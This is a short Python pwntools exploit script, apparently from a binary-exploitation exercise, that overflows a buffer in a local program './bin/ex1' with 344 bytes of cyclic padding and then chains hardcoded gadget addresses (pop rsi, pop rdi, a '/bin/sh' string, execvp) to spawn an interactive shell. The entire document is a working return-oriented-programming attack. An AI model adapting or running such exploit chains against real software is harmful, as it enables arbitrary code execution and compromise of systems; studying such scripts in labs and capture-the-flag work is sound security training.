#!/usr/bin/env python3

from pwn import *

execvp_addr = 0x7ffff7ceb5f0
# ret_addr = 0x400061
bin_sh_addr = 0x7ffff7dd8678
pop_rdi_addr = 0x7ffff7fc651e
pop_rsi_addr = 0x7ffff7fc84da
target = process("./bin/ex1")

payload = b"0" + cyclic(344)
payload += p64(pop_rsi_addr)
payload += p64(0x0)
# payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(bin_sh_addr)
payload += p64(execvp_addr) 

target.send(payload) 

target.interactive()
